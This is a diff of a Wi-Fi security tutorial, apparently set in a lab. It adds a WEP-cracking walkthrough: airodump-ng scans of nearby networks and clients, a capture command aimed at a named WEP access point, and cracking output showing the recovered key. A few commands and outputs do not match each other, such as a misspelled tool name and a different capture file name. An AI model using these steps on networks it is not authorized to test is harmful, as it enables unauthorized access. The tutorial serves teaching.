@@ -179,7 +179,7 @@ phy0    wlan0           rtl8814au       Realtek Semiconductor Corp. RTL8814AU 80
 
 Switching to monitor mode is a powerful technique that gives you deep insight into wireless traffic around you, but remember to always use it responsibly and respect privacy and legal guidelines.
 
-### Case 1: Capturing Packets
+### Case 1: Capturing Packets (WEP Passive Attack)
 
 As remembered from our discussion above, we know that we need to get keystreams along with different IVs, and to achieve this, we need both ciphertext and plaintext. To obtain plaintext data, we will make use of ARP packets. So, let’s capture those packets. In this example, we are assuming the network is busy, so we will not combine this with an ARP replay attack and will simply try to get as many keystreams as possible.
 
@@ -191,31 +191,101 @@ Once this is done, use `airodump-ng` followed by the name of the adapter to list
 ┌──(proxygeek㉿VMware-kali)-[~]
 └─$ sudo airodump-ng wlan0
 
- CH  2 ][ Elapsed: 1 min ][ 2025-06-01 03:55 ][ paused output                                                                                               
+ CH 14 ][ Elapsed: 36 s ][ 2025-06-01 20:36 ][ enabled AP selection                                                                                         
                                                                                                                                                             
  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                            
                                                                                                                                                             
- 1X:XX:XX:XX:XX:XX  -82       15        0    0   1  130   WPA2 CCMP   PSK  1XXXXXX                                                                     
- 2X:XX:XX:XX:XX:XX  -82        9        0    0  11  130   WPA2 CCMP   PSK  <length:  0>                                                                    
- 3X:XX:XX:XX:XX:XX  -83        9        0    0  11  130   WPA2 CCMP   PSK  <length:  0>                                                                    
- 4X:XX:XX:XX:XX:XX  -82       18        1    0  11  195   WPA2 CCMP   PSK  4XXXXXX                                                                  
- 5X:XX:XX:XX:XX:XX  -82       21        8    0   1  130   WPA2 CCMP   PSK  5XXXXXX                                                                         
- 6X:XX:XX:XX:XX:XX  -80       34        0    0   1  135   WPA2 CCMP   PSK  <length:  0>                                                                    
- 7X:XX:XX:XX:XX:XX  -81       35        4    0   6  130   WEP  WEP         GUEST                                                                        
- 8X:XX:XX:XX:XX:XX  -71       95        0    0   6  130   WPA2 CCMP   PSK  8XXXXXX                                                                      
- 9X:XX:XX:XX:XX:XX  -61       22        2    0  11  260   WPA2 CCMP   PSK  9XXXXXX                                                                       
- 10:XX:XX:XX:XX:XX  -57      158       93    0   6  260   WPA2 CCMP   PSK  10XXXXX                                                                      
- 11:XX:XX:XX:XX:XX  -70       96       36    0   6  130   WPA3 CCMP   SAE  <length:  0>                                                                    
- 12:XX:XX:XX:XX:XX  -57      156      332    2   6  260   WPA3 CCMP   SAE  <length:  0>                                                                    
+ D2:57:AE:4D:FB:67  -28       28        0    0   6   54   WPA2 CCMP   PSK  MiFibra-5-D6G3                                                                   
+ 9E:B9:D9:28:98:08  -28       28        0    0   6   54   WPA2 CCMP   PSK  WIFI-JUAN                                                                       
+ F0:9F:C2:71:22:10  -28       28       36    0   6   54   OPN              wifi-guest                                                                      
+ F0:9F:C2:71:22:12  -28       28       26    0   6   54   WPA2 CCMP   PSK  wifi-mobile                                                                     
+ F0:9F:C2:11:0A:24  -28       26        0    0  11   54e  WPA3 CCMP   SAE  wifi-management                                                                 
+ F0:9F:C2:6A:88:26  -28       26        0    0  11   54   OPN              <length:  9>                                                                    
+ F0:9F:C2:1A:CA:25  -28       26        0    0  11   54e  WPA3 CCMP   SAE  wifi-IT                                                                         
+ CA:23:53:5F:4D:1E  -28       28        0    0   9   54   WPA2 TKIP   PSK  vodafone7123                                                                    
+ BA:CD:DE:5F:67:03  -28       57        0    0   3   54   WPA2 CCMP   PSK  MOVISTAR_JYG2                                                                   
+ F0:9F:C2:71:22:11  -28       57     2256   29   3   54   WEP  WEP         wifi-old                                                                         
 
  BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
 
- 8X:XX:XX:XX:XX:XX  AX:XX:XX:XX:XX:XX  -91    0 - 6      0        3                                                                                         
- 9X:XX:XX:XX:XX:XX  DX:XX:XX:XX:XX:XX  -73    0 - 1e     0        3    
+ F0:9F:C2:71:22:10  B0:72:BF:44:B0:49  -29   54 -54      0       10                                                                                         
+ F0:9F:C2:71:22:10  80:18:44:BF:72:47  -29   54 -54      0       10                                                                                         
+ F0:9F:C2:71:22:10  B0:72:BF:B0:78:48  -29   54 -54      0       16                                                                                         
+ F0:9F:C2:71:22:12  28:6C:07:6F:F9:44  -29   54 -54      0       26                                                                                         
+ F0:9F:C2:71:22:11  62:B2:93:BA:E5:6E  -29   54 -54   1737     2252                                                                                         
+ (not associated)   64:32:A8:BA:6C:41  -26    0 - 1      0        2         wifi-corp                                                                       
+ (not associated)   1A:01:F0:BA:C2:79  -49    0 - 1      0        2                                                                                         
+ (not associated)   9A:8D:59:B9:D4:B6  -49    0 - 1      0        2                                                                                         
+ (not associated)   66:2F:64:09:FD:A3  -49    0 - 1      0        2                                                                                         
+ (not associated)   64:32:A8:07:6C:40  -26    0 - 1      0        3         AP_router,wifi-corp                                                             
+ (not associated)   0E:36:7D:32:3F:42  -49    0 - 1      0        1                                                                                         
+ (not associated)   64:32:A8:AD:AB:53  -49    0 - 1      0        4         wifi-corp-legacy                                                                
+ (not associated)   78:C1:A7:BF:72:46  -49    0 - 1      0        9         wifi-offices,Jason                                                              
+ (not associated)   B4:99:BA:6F:F9:45  -49    0 - 1      0        9         wifi-offices,Jason                                                              
+ (not associated)   B2:D8:F6:6C:2F:A6  -49    0 - 1      0        1                                                                                         
+ (not associated)   64:32:A8:BA:18:42  -26    0 - 1      0        2                                                                                         
+ (not associated)   64:32:A8:BC:53:51  -26    0 - 1      0        4         open-wifi,home-WiFi,WiFi-Restaurant   
 ```
 
-In my case, the Access Point named `GUEST` is using a WEP connection. Now we will capture packets from this target network.
+In my case, the Access Point named `wifi-old` is using a WEP connection. Now we will capture packets from this target network.
 To do so, run the following command to capture packets, replacing the BSSID and channel with those of the victim network:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo airodump-ng --bssid F0:9F:C2:71:22:11 -c 3 -w wep.cap wlan0mon
+
+CH  3 ][ Elapsed: 24 s ][ 2025-06-01 20:41            
+                                                       
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH 
+                                                       
+ F0:9F:C2:71:22:11  -28   0      268    10561  384   3 
+                                                       
+ BSSID              STATION            PWR    Rate     
+                                                       
+ F0:9F:C2:71:22:11  62:B2:93:BA:E5:6E  -29   54 -54      0    10534 
+```
+
+The `--write` option saves all captured packets to the specified file. Capture around 10,000 packets; the capture file will be saved in your current working directory.
+After you have enough packets, run aireplay-ng with the capture file to try and recover the password:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo airecrack-ng wep.cap
+
+Reading packets, please wait...
+Opening capture-01.cap
+Read 24937 packets.
+
+   #  BSSID  Got 24776 out of 20000 IVsStarting PTW attack with 24776 ivs.
+
+   1  F0:9F:C2:71:22:11  wifi-old                  WEP (24776 IVs)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening capture-01.cap
+Read 24937 packets.
+
+1 potential targets
+
+Attack will be restarted every 5000 captured ivs.
+
+                  Aircrack-ng 1.7 
+
+
+    [00:00:00] Tested 6 keys (got 24776 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  1   11(35840) 86(32256) C1(30208) 
+    1    0/  5   F5(32000) 26(31232) 35(31232) 
+    2    0/  1   33(34816) BF(31232) B5(30976) 
+    3    0/  1   CD(33792) EA(31744) F6(30976) 
+    4    0/  1   55(32768) 23(31488) 7B(31488) 
+
+                         KEY FOUND! [ 11:BB:33:CD:55 ] 
+        Decrypted correctly: 100%
+
+```
 
 ## Monitoring
 
